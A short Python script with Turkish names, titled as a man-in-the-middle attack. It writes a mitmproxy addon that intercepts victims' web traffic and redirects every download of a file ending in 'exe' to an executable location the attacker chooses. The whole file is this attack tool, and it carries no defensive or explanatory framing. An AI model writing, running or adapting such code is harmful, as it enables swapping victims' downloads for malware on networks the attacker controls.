import os

def mitm_saldiri(exeyol):
    with open("a.py", "w") as dosya:
        dosya.write('''
import mitmproxy
import os
''')
        dosya.write(f'exeyol="{exeyol}"\n')
        dosya.write('''
def request(flow):
    if flow.request.host != exeyol and flow.request.pretty_url.endswith("exe"):
        flow.response = mitmproxy.http.Response.make(301, "", {"Location": exeyol})
''')
